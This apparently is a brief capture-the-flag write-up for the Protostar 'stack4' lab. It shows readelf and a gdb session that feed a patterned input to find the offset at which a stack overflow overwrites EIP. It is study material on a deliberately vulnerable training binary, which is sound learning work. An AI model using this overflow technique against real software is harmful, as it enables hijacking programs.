**Stack4**

Almost the same exact code from the last level.
Only here we need the find the eip offset and change it ourselves.
I know we have stuff like cyclic, and cyclic_find, but finding the offset is a lot more fun :)
```diff
$ readelf -s stack4 | grep win
$ gdb stack4
(gdb) r
Starting program: /opt/protostar/bin/stack4 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDDDDEEEEFFFFGGGG

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```